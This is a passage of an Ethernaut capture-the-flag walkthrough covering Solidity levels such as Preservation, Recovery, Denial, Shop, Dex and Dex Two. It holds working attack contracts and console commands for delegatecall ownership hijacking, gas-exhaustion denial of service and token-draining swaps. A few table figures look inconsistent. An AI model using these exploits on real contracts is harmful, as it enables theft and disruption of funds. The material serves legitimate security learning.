- Save your variables to `memory` if you don’t need to persist smart contract state. [SSTORE](https://www.ethervm.io/#SSTORE) and [SLOAD](https://www.ethervm.io/#SLOAD) are very gas intensive opcodes.
- All storage is publicly visible on the blockchain, even your `private` variables!
- Never store passwords and private keys without hashing them first
- 1 byte = 8 bits = 2 hex
- uint8 = bool = 1 byte
- uint16 = 2 bytes

### Level 13. Gatekeeper One

**Goal**: `player` has to pass all require checks and set entrant to player address.

Given contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract GatekeeperOne {

  using SafeMath for uint256;
  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft().mod(8191) == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```

Useful links:

- [gasleft](https://docs.soliditylang.org/en/v0.8.3/units-and-global-variables.html#block-and-transaction-properties) function
- Solidity [opcode](https://medium.com/@blockchain101/solidity-bytecode-and-opcode-basics-672e9b1a88c2) basics
- [Explicit Conversion](https://docs.soliditylang.org/en/v0.8.3/types.html#explicit-conversions) between types

### Level 14. Gatekeeper Two

### Level 15. Naught Coin

### Level 16. Preservation

**Goal**: `player` has to claim the ownership of `Preservation`.

Given contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Preservation {

  // public library contracts
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner;
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public {
    timeZone1Library = _timeZone1LibraryAddress;
    timeZone2Library = _timeZone2LibraryAddress;
    owner = msg.sender;
  }

  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp
  uint storedTime;

  function setTime(uint _time) public {
    storedTime = _time;
  }
}
```

The vulnerability `Preservation` contract comes from the fact that its storage layout is **NOT** parallel or complementing to that of `LibraryContract` whose method the `Preservation` is calling using `delegatecall`.

Since `delegatecall` is **_context-preserving_** any write would alter the storage of `Preservation`, and **NOT** `LibraryContract`.

The call to `setTime` of `LibraryContract` is supposed to change `storedTime` (slot 3) in `Preservation` but instead it would write to `timeZone1Library` (slot 0). This is because storeTime of `LibraryContract` is at slot 0 and the corresponding slot 0 storage at `Preservation` is `timeZone1Library`.

|        | LibraryContract |      Preservation       |
| :----: | :-------------: | :---------------------: |
| Slot 0 |   storedTime    | &larr; timeZone1Library |
| Slot 1 |        -        |    timeZone2Library     |
| Slot 2 |        -        |          owner          |
| Slot 3 |        -        |       storedTime        |

Solution:

This information can be used to alter `timeZone1Library` address to a malicious contract - `HackLibraryContract`. So that calls to `setTime` is executed in a `HackLibraryContract`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

contract HackLibraryContract {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint _time) public {
        owner = msg.sender;
    }
}
```

Note that storage layout of `HackLibraryContract` is complementing to `Preservation` so that proper state variables are changed in `Preservation` when any storage changes. Moreover, `setTime` contains malicious code that changes ownership to msg.sender (which would the `player`).

First deploy EvilLibraryContract and copy it's address. Then alter the timeZone1Library in Preservation by:

```js
await contract.setFirstTime(<hack-library-contract-address>)
```

(a 32 byte `uint` type can accommodate 20 byte `address` value)

Now the `delegatecall` in `setFirstTime` would execute `setTime` of `HackLibraryContract`, instead of `LibraryContract` since `timeZone1Library` is now your malicious contract address.

Call `setFirstTime` with any `uint` param:

```js
await contract.setFirstTime(1);
```

As the previous level, `delegate` mentions, the use of `delegatecall` to call libraries can be risky. This is particularly true for contract libraries that have their own state. This example demonstrates why the `library` keyword should be used for building libraries, as it prevents the libraries from storing and accessing state variables.

**_Key Security Takeaways_**

- **Ideally, libraries should not store state.**
- When creating libraries, use `library`, not `contract`, to ensure libraries will not modify caller storage data when caller uses `delegatecall`.
- Use higher level function calls to inherit from libraries, especially when you i) don’t need to change contract storage and ii) do not care about gas control.

Useful links:

- Context preserving nature of delegatecall function
  - `delegatecall` preserves contract context. This means that code that is executed via `delegatecall` will act on the state (i.e., storage) of the calling contract. [Source](https://www.bookstack.cn/read/ethereumbook-en/spilt.6.c2a6b48ca6e1e33c.md)
  - [DelegateCall: Calling Another Contract Function in Solidity
    ](https://medium.com/coinmonks/delegatecall-calling-another-contract-function-in-solidity-b579f804178c)
    - EOA: Externally Owned Account

### Level 17. Recovery

**Goal**: `player` has to retrieve the funds from the lost address of contract which was created using the `Recovery`'s first transaction.

Useful links:

- Basic [Etherscan](https://rinkeby.etherscan.io/) inspection
- [Determining address of a new contract](https://swende.se/blog/Ethereum_quirks_and_vulns.html)

Given contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Recovery {

  //generate tokens
  function generateToken(string memory _name, uint256 _initialSupply) public {
    new SimpleToken(_name, msg.sender, _initialSupply);

  }
}

contract SimpleToken {

  using SafeMath for uint256;
  // public variables
  string public name;
  mapping (address => uint) public balances;

  // constructor
  constructor(string memory _name, address _creator, uint256 _initialSupply) public {
    name = _name;
    balances[_creator] = _initialSupply;
  }

  // collect ether in return for tokens
  receive() external payable {
    balances[msg.sender] = msg.value.mul(10);
  }

  // allow transfers of tokens
  function transfer(address _to, uint _amount) public {
    require(balances[msg.sender] >= _amount);
    balances[msg.sender] = balances[msg.sender].sub(_amount);
    balances[_to] = _amount;
  }

  // clean up after ourselves
  function destroy(address payable _to) public {
    selfdestruct(_to);
  }
}
```

If the address of the lost `SimpleToken` address is retrieved it's funds can be retrieved using the `destroy` method.

The easiest way to solve this would be to copy the address of `Recovery` in [Etherscan (on Rinkeby network)](https://rinkeby.etherscan.io/) and inspect transactions in **Internal Txns** tab. Find the latest **Contract Creation** transaction and click through the same to get the address of created contract.

Now simply call `destroy` method at that address.
So, if `tokenAddr` is the retrieved address then:

```js
functionSignature = {
  name: "destroy",
  type: "function",
  inputs: [
    {
      type: "address",
      name: "_to",
    },
  ],
};

params = [player];

data = web3.eth.abi.encodeFunctionCall(functionSignature, params);

await web3.eth.sendTransaction({ from: player, to: tokenAddr, data });
```

Another way to get the lost address is by utilizing the fact that creation of addresses of Ethereum is deterministic and can be calculated by:

```js
keccack256(address, nonce);
```

where `address` is the address of contract that created the transaction and `nonce` is the number of contracts the creator address has created. You can read more [here](https://swende.se/blog/Ethereum_quirks_and_vulns.html) and [there](https://medium.com/coinmonks/ethernaut-lvl-18-recovery-walkthrough-how-to-retrieve-lost-contract-addresses-in-2-ways-aba54ab167d3).

**_Key Security Takeaways_**

- **Money laundering potential**: this [blog post](https://swende.se/blog/Ethereum_quirks_and_vulns.html) elaborates on the potential of using future contract addresses to hide money. Essentially, you can send Ethers to a deterministic address, but the contract there is currently nonexistent. These funds are effectively lost forever until you decide to create a contract at that address and regain ownership.
- **You are not anonymous on Ethereum**: Anyone can follow your current transaction traces, as well as monitor your future contract addresses. This transaction pattern can be used to derive your real world identity.

### Level 18. Magic Number

### Level 19. Alien Codex

### Level 20. Denial

**Goal**: `player` has to plant a denial of service attack such that `owner` is unable to withdraw funds through `withdraw` method.

This is a simple wallet that drips funds over time. You can withdraw the funds slowly by becoming a withdrawing partner.

If you can deny the owner from withdrawing funds when they call `withdraw()` (whilst the contract still has funds, and the transaction is of 1M gas or less) you will win this level.

This contract's vulnerability comes from the `withdraw` method which does not mitigate against possible attack through execution of some unknown external contract code through `call` method. `call` did not set a gas limit that external call can use.

The `call` method here can invoke the `receive` method of a malicious contract at `partner` address. And this is where we're going to eat up all gas so that `withdraw` function `revert`s with out of gas exception.

Given contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Denial {

    using SafeMath for uint256;
    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address payable public constant owner = address(0xA9E);
    uint timeLastWithdrawn;
    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint amountToSend = address(this).balance.div(100);
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value:amountToSend}("");
        owner.transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = now;
        withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].add(amountToSend);
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint) {
        return address(this).balance;
    }
}
```

Solution:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

contract HackDenial {
    // gas burner
    uint256 n;
    function burn() internal {
        while (gasleft() > 0) {
            n += 1;
        }
    }

    receive() external payable {
        burn();
    }
}
```

This level demonstrates that external calls to unknown contracts can still create denial of service attack vectors if a fixed amount of gas is not specified.

If you are using a low level `call` to continue executing in the event an external call reverts, ensure that you specify a fixed gas stipend. For example `call.gas(100000).value()`.

Typically one should follow the [checks-effects-interactions](https://docs.soliditylang.org/en/latest/security-considerations.html#use-the-checks-effects-interactions-pattern) pattern to avoid reentrancy attacks, there can be other circumstances (such as multiple external calls at the end of a function) where issues such as this can arise.

_Note_: An external `CALL` can use at most 63/64 of the gas currently available at the time of the `CALL`. Thus, depending on how much gas is required to complete a transaction, a transaction of sufficiently high gas (i.e. one such that 1/64 of the gas is capable of completing the remaining opcodes in the parent call) can be used to mitigate this particular attack.

### Level 21. Shop

**Goal**: `player` has to set price to less than it's current value.

Given contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}
```

Solution:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface IShop {
    function buy() external;
    function price() external view returns (uint);
    function isSold() external view returns (bool);
}

contract Buyer {

    function price() external view returns (uint) {
        bool isSold = IShop(msg.sender).isSold();
        uint askedPrice = IShop(msg.sender).price();
        if (!isSold) return askedPrice;
        return 0;
    }

    function callBuy(address _shopAddr) public {
        IShop(_shopAddr).buy();
    }
}
```

The new value of `price` is fetched by calling `price()` method of a `Buyer` contract. Note that there are two distinct `price()` calls - in the `if` statement check and while setting new value of `price`. A `Buyer` can cheat by returning a legit value in `price()` method of `Buyer` during the first invocation (during `if` check) and returning any less value, say 0, during second invocation (while setting `price`).

But, we can't track the number of `price()` invocation in `Buyer` contract because `price()` must be a view function (as per the interface) - can't write to storage! However, look closely new `price` in `buy()` is set after isSold is set to `true`. We can read the public `isSold` variable and return from `price()` of `Buyer` contract accordingly.

**_Key Security Takeaways_**

- Understanding restrictions of [view functions](https://docs.soliditylang.org/en/develop/contracts.html#view-functions)
- Contracts can manipulate data seen by other contracts in any way they want.
- It's unsafe to change the state based on external and untrusted contracts logic.

### Level 22. Dex

Useful links:

- [ERC20 Token Standard](https://eips.ethereum.org/EIPS/eip-20)
- Solidity [division operation](https://docs.soliditylang.org/en/v0.8.11/types.html#division)

**Goal**: `player` has to drain all of at least one of the two tokens - `token1` and `token2` from the basic [DEX](https://en.wikipedia.org/wiki/Decentralized_finance#Decentralized_exchanges) contract.

Given contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import '@openzeppelin/contracts/math/SafeMath.sol';
import '@openzeppelin/contracts/access/Ownable.sol';

contract Dex is Ownable {
  using SafeMath for uint;
  address public token1;
  address public token2;
  constructor() public {}

  function setTokens(address _token1, address _token2) public onlyOwner {
    token1 = _token1;
    token2 = _token2;
  }

  function addLiquidity(address token_address, uint amount) public onlyOwner {
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }

  function swap(address from, address to, uint amount) public {
    require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swapAmount = getSwapPrice(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
  }

  function getSwapPrice(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }

  function approve(address spender, uint amount) public {
    SwappableToken(token1).approve(msg.sender, spender, amount);
    SwappableToken(token2).approve(msg.sender, spender, amount);
  }

  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}

contract SwappableToken is ERC20 {
  address private _dex;
  constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) public ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
  }

  function approve(address owner, address spender, uint256 amount) public returns(bool){
    require(owner != _dex, "InvalidApprover");
    super._approve(owner, spender, amount);
  }
}
```

The vulnerability originates from `get_swap_price` method which determines the exchange rate between tokens in the Dex. The division in it won't always calculate to a perfect integer, but a fraction. And there is **_NO_** fraction types in Solidity. Instead, _division rounds towards zero_. according to docs. For example, `3 / 2 = 1` in solidity.

We're going to swap all of our `token1` for `token2`. Then swap all our `token2` to obtain `token1`, then swap all our `token1` for `token2` and so on.

Here's how the price history & balances would go. Initially,

|  DEX   |        | player |        |
| :----: | :----: | :----: | :----: |
| token1 | token2 | token1 | token2 |
|  100   |  100   |   10   |   10   |

After swapping all of `token1`:

|  DEX   |        | player |        |
| :----: | :----: | :----: | :----: |
| token1 | token2 | token1 | token2 |
|  100   |  100   |   10   |   10   |
|  110   |   90   |   0    |   20   |

Note that at this point exchange rate is adjusted. Now, exchanging 20 `token2` should give 20 \* 110 / 90 = 24.44... But since division results in integer we get 24 `token2`. Price adjusts again. Swap again.

|  DEX   |        | player |        |
| :----: | :----: | :----: | :----: |
| token1 | token2 | token1 | token2 |
|  100   |  100   |   10   |   10   |
|  110   |   90   |   0    |   20   |
|   86   |  110   |   24   |   0    |

Notice that on each swap we get more of `token1` or `token2` than held before previous swap. This is due to the inaccuracy of price calculation in `get_swap_price` method.

Keep swapping and we'll get:

|  DEX   |        | player |        |
| :----: | :----: | :----: | :----: |
| token1 | token2 | token1 | token2 |
|  100   |  100   |   10   |   10   |
|  110   |   90   |   0    |   20   |
|   86   |  110   |   24   |   0    |
|  110   |   80   |   0    |   30   |
|   69   |  110   |   41   |   0    |
|  110   |   45   |   0    |   65   |

Now, at the last swap above we've gotten hold of 65 `token2`, which is more than enough to drain all of 110 token1! By simple calculation, only 45 of token2 is required to get all 110 of `token1`.

|  DEX   |        | player |        |
| :----: | :----: | :----: | :----: |
| token1 | token2 | token1 | token2 |
|  100   |  100   |   10   |   10   |
|  110   |   90   |   0    |   20   |
|   86   |  110   |   24   |   0    |
|  110   |   80   |   0    |   30   |
|   69   |  110   |   41   |   0    |
|  110   |   45   |   0    |   65   |
|   0    |   90   |  110   |   20   |

Jump into console. First approve the contract to transfer your tokens with a big enough allowance so that we don't have to approve again & again. Allowance of 500 should be more than enough:

```js
await contract.approve(contract.address, 500);
```

Get token addresses:

```js
t1 = await contract.token1();
t2 = await contract.token2();
```

```js
await contract.swap(t1, t2, 10);
await contract.swap(t2, t1, 20);
await contract.swap(t1, t2, 24);
await contract.swap(t2, t1, 30);
await contract.swap(t1, t2, 41);
await contract.swap(t2, t1, 45);
```

The integer math portion aside, getting prices or any sort of data from any single source is a massive attack vector in smart contracts.

You can clearly see from this example, that someone with a lot of capital could manipulate the price in one fell swoop, and cause any applications relying on it to use the the wrong price.

The exchange itself is decentralized, but the price of the asset is centralized, since it comes from 1 dex. This is why we need [oracles](https://betterprogramming.pub/what-is-a-blockchain-oracle-f5ccab8dbd72). Oracles are ways to get data into and out of smart contracts. We should be getting our data from multiple independent decentralized sources, otherwise we can run this risk.

[Chainlink Data Feeds](https://docs.chain.link/docs/get-the-latest-price/) are a secure, reliable, way to get decentralized data into your smart contracts. They have a vast library of many different sources, and also offer [secure randomness](https://docs.chain.link/docs/chainlink-vrf/), ability to make [any API call](https://docs.chain.link/docs/make-a-http-get-request/), [modular oracle network creation](https://docs.chain.link/docs/architecture-decentralized-model/), [upkeep, actions, and maintenance](https://docs.chain.link/docs/chainlink-keepers/introduction/), and unlimited customization.

[Uniswap TWAP Oracles](https://docs.uniswap.org/protocol/V2/concepts/core-concepts/oracles) relies on a time weighted price model called [TWAP](https://en.wikipedia.org/wiki/Time-weighted_average_price#). While the design can be attractive, this protocol heavily depends on the liquidity of the DEX protocol, and if this is too low, prices can be easily manipulated.

### Level 23. Dex Two

**Goal**: `player` has to drain all of `token1` and `token2`.

Given Contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import '@openzeppelin/contracts/math/SafeMath.sol';
import '@openzeppelin/contracts/access/Ownable.sol';

contract Dex is Ownable {
  using SafeMath for uint;
  address public token1;
  address public token2;
  constructor() public {}

  function setTokens(address _token1, address _token2) public onlyOwner {
    token1 = _token1;
    token2 = _token2;
  }

  function addLiquidity(address token_address, uint amount) public onlyOwner {
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }

  function swap(address from, address to, uint amount) public {
    require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swapAmount = getSwapPrice(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
  }

  function getSwapPrice(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }

  function approve(address spender, uint amount) public {
    SwappableToken(token1).approve(msg.sender, spender, amount);
    SwappableToken(token2).approve(msg.sender, spender, amount);
  }

  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}

contract SwappableToken is ERC20 {
  address private _dex;
  constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) public ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
  }

  function approve(address owner, address spender, uint256 amount) public returns(bool){
    require(owner != _dex, "InvalidApprover");
    super._approve(owner, spender, amount);
  }
}
```

The vulnerability here arises from `swap` method which does not check that the swap is necessarily between `token1` and `token2`. We'll exploit this.

Let's deploy a token - `EvilToken` in Remix, with initial supply of 400, all given to `msg.sender` which would be the `player`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract EvilToken is ERC20 {
    constructor(uint256 initialSupply) ERC20("EvilToken", "EVL") {
        _mint(msg.sender, initialSupply);
    }
}
```

We're going to exchange `EVL` token for `token1` and `token2` in such a way to drain both from `DexTwo`. Initially both `token1` and `token2` is 100. Let's send 100 of `EVL` to `DexTwo` using `EvilToken`'s `transfer`. So, that price ratio in `DexTwo` between `EVL` and `token1` is 1:1. Same ratio goes for `token2`.

Also, allow `DexTwo` to transact 300 (100 for `token1` and 200 for `token2` exchange) of our `EVL` tokens so that it can swap `EVL` tokens. This can be done by `approve` method of `EvilToken`, passing `contract.address` and `200` as params.

Alright at this point `DexTwo` has 100 of each - `token1`, `token2` and `EVL`. And `player` has 300 of `EVL`.

|  DEX   |        |     | player |        |     |
| :----: | :----: | --- | :----: | :----: | --- |
| token1 | token2 | EVL | token1 | token2 | EVL |
|  100   |  100   | 100 |   10   |   10   | 300 |

Get token addresses:

```js
evlToken = "<EVL-token-address>";
t1 = await contract.token1();
t2 = await contract.token2();
```

Swap 100 of `player`'s `EVL` with `token1`:

```js
await contract.swap(evlToken, t1, 100);
```

Updated balances:

|  DEX   |        |     | player |        |     |
| :----: | :----: | --- | :----: | :----: | --- |
| token1 | token2 | EVL | token1 | token2 | EVL |
|  100   |  100   | 100 |   10   |   10   | 300 |
|   0    |  100   | 200 |  110   |   10   | 200 |

Now, according to `get_swap_amount` method, to get all 100 of `token2` in exchange we need 200 of `EVL`. Swap accordingly:

```js
await contract.swap(evlToken, t2, 200);
```

Finally:

|  DEX   |        |     | player |        |     |
| :----: | :----: | :-: | :----: | :----: | :-: |
| token1 | token2 | EVL | token1 | token2 | EVL |
|  100   |  100   | 100 |   10   |   10   | 300 |
|   0    |  100   | 200 |  110   |   10   | 200 |
|   0    |   0    | 400 |  110   |  110   |  0  |

Useful links:
[Using Remix to Deploy to Moonbeam](https://docs.moonbeam.network/builders/build/eth-api/dev-env/remix/)

### Level 24. Puzzle Wallet

### Level 25. Motorbike

### Level 26. Double Entry Point

## MISC.

- [payable() function In solidity](https://ethereum.stackexchange.com/questions/20874/payable-function-in-solidity)
- [What are pure functions in Solidity?](https://www.educative.io/answers/what-are-pure-functions-in-solidity)
- [Solidity's documentation and learn its caveats](http://solidity.readthedocs.io/en/develop/contracts.html#view-functions)
- [Sending Ether (transfer, send, call)](https://solidity-by-example.org/sending-ether/) explains what fallback function is called based on calldata.

## Credits

- [Ethernaut Community Solutions](https://forum.openzeppelin.com/t/ethernaut-community-solutions/561)
- [Naveen on dev.to](https://dev.to/nvn/series/161104)
